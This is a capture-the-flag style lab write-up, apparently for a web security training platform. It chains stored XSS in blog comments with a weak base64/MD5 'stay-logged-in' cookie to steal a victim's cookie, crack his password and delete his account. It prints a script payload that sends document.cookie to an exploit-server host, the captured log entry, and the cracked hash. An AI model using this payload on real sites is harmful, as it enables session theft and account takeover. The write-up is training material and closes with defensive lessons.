@@ -1,0 +1,117 @@
+================================
+LAB: Offline password cracking
+================================
+
+[LAB INFORMATION]
+-----------------
+Date: January 20, 2026
+Lab URL: https://0aaf00dd046f6dc0809d301b00ae0005.web-security-academy.net
+Category: Authentication Vulnerabilities
+Level: Practitioner
+Objective: Obtain Carlos's stay-logged-in cookie using XSS, crack his password offline, then log in as carlos and delete his account from the "My account" page.
+Description: This lab stores the user's password hash in a cookie. The lab also contains an XSS vulnerability in the comment functionality. Credentials provided: wiener:peter. Victim's username: carlos.
+
+[RECONNAISSANCE]
+----------------
+1. Initial login with wiener:peter credentials revealed a "stay-logged-in" cookie mechanism
+2. Intercepted authentication request showed cookie format: stay-logged-in=d2llbmVyOjUxZGMzMGRkYzQ3M2Q0M2E2MDExZTllYmJhNmNhNzcw
+3. Base64 decoded cookie revealed structure: username:md5_hash
+   - Decoded value: wiener:51dc30ddc473d43a6011e9ebba6ca770
+   - MD5 hash of "peter" confirmed: 51dc30ddc473d43a6011e9ebba6ca770
+4. Identified comment functionality as potential XSS injection point
+5. Exploit server available at: https://exploit-0ae1006d04dc6d5c80b42fb2014000c8.exploit-server.net
+
+[VULNERABILITY DISCOVERY]
+-------------------------
+1. Tested XSS in comment form fields using basic payload: <script>alert(1)</script>
+2. Submitted test payload in 'comment' field with benign values in other fields (name, email, website)
+3. Upon posting, redirected to confirmation page with no immediate execution
+4. Returned to blog post page - popup appeared, confirming JavaScript execution
+5. Reloaded page multiple times - popup persisted, confirming Stored XSS vulnerability
+6. Identified vulnerable parameter: comment field stores unfiltered HTML/JavaScript
+7. Cookie mechanism weakness: base64(username:md5(password)) is reversible and MD5 is crackable
+
+[EXPLOITATION]
+--------------
+1. Crafted XSS payload to exfiltrate cookies to exploit server:
+   <script>document.location='https://exploit-0ae1006d04dc6d5c80b42fb2014000c8.exploit-server.net/?c='+document.cookie</script>
+
+2. Posted malicious comment on blog post (/post?postId=9):
+   - Comment: <script>document.location='https://exploit-0ae1006d04dc6d5c80b42fb2014000c8.exploit-server.net/?c='+document.cookie</script>
+   - Name: test
+   - Email: test@test.com
+   - Website: http://test.com
+
+3. Lab simulated Carlos visiting the blog post containing the malicious comment
+
+4. XSS triggered in Carlos's browser, redirecting him to exploit server with cookies in URL
+
+5. Retrieved Carlos's cookies from exploit server access logs:
+   GET /?c=secret=SNNblqKlLVQaSCrIch4aUTEJLFSwgGYG;%20stay-logged-in=Y2FybG9zOjI2MzIzYzE2ZDVmNGRhYmZmM2JiMTM2ZjI0NjBhOTQz
+   User-Agent: Mozilla/5.0 (Victim) - confirmed Carlos's session
+
+6. Extracted stay-logged-in cookie value: Y2FybG9zOjI2MzIzYzE2ZDVmNGRhYmZmM2JiMTM2ZjI0NjBhOTQz
+
+7. Base64 decoded cookie:
+   carlos:26323c16d5f4dabff3bb136f2460a943
+
+8. Cracked MD5 hash offline:
+   - Hash: 26323c16d5f4dabff3bb136f2460a943
+   - Plaintext password: onceuponatime
+
+9. Logged in as carlos:onceuponatime
+
+10. Navigated to "My account" page and deleted Carlos's account
+
+11. Lab marked as solved
+
+[EVIDENCE]
+----------
+1. Wiener's cookie decoded:
+   - Base64: d2llbmVyOjUxZGMzMGRkYzQ3M2Q0M2E2MDExZTllYmJhNmNhNzcw
+   - Decoded: wiener:51dc30ddc473d43a6011e9ebba6ca770
+   - MD5 verified: 51dc30ddc473d43a6011e9ebba6ca770 = md5("peter")
+
+2. XSS payload confirmation: alert(1) popup displayed on page reload, proving persistent storage
+
+3. Exploit server access log entry:
+   10.0.4.109 2026-01-20 15:05:06 +0000 "GET /?c=secret=SNNblqKlLVQaSCrIch4aUTEJLFSwgGYG;%20stay-logged-in=Y2FybG9zOjI2MzIzYzE2ZDVmNGRhYmZmM2JiMTM2ZjI0NjBhOTQz HTTP/1.1" 200 "user-agent: Mozilla/5.0 (Victim)..."
+
+4. Carlos's cookie decoded:
+   - Base64: Y2FybG9zOjI2MzIzYzE2ZDVmNGRhYmZmM2JiMTM2ZjI0NjBhOTQz
+   - Decoded: carlos:26323c16d5f4dabff3bb136f2460a943
+   - MD5 cracked: 26323c16d5f4dabff3bb136f2460a943 = "onceuponatime"
+
+5. Successful authentication as carlos and account deletion confirmed lab completion
+
+[LESSONS LEARNED]
+-----------------
+1. Cookie Security:
+   - Never store password-derived data client-side, even if hashed
+   - base64 encoding provides NO security - it's encoding, not encryption
+   - MD5 is cryptographically broken and easily crackable with rainbow tables or wordlists
+   - Proper implementation: server-side session tokens with no password correlation
+
+2. XSS Prevention:
+   - All user input must be sanitized before storage and output encoding before display
+   - Comment fields are high-risk XSS vectors due to rich content expectations
+   - Stored XSS has persistent impact affecting all subsequent visitors
+   - Content Security Policy (CSP) headers can mitigate XSS impact
+
+3. Vulnerability Chaining:
+   - Individual weaknesses (XSS + weak cookie) combine for critical impact
+   - XSS alone = session hijacking (temporary)
+   - XSS + reversible password cookie = permanent account compromise
+   - Defense in depth prevents single vulnerability from causing catastrophic failure
+
+4. Offensive Security Methodology:
+   - Always verify assumptions (tested base64 decoding with known credentials first)
+   - Start with simple payloads (alert(1)) before complex exploitation
+   - Manual verification before automation ensures understanding
+   - Access logs are critical for blind exfiltration attacks
+
+5. Real-World Impact:
+   - Attacker gains permanent access even after password change (if cookie persists)
+   - Can perform account takeover, data exfiltration, privilege escalation
+   - Stored XSS affects all users, not just targeted victim
+   - Combination allows offline cracking, bypassing rate limiting and detection
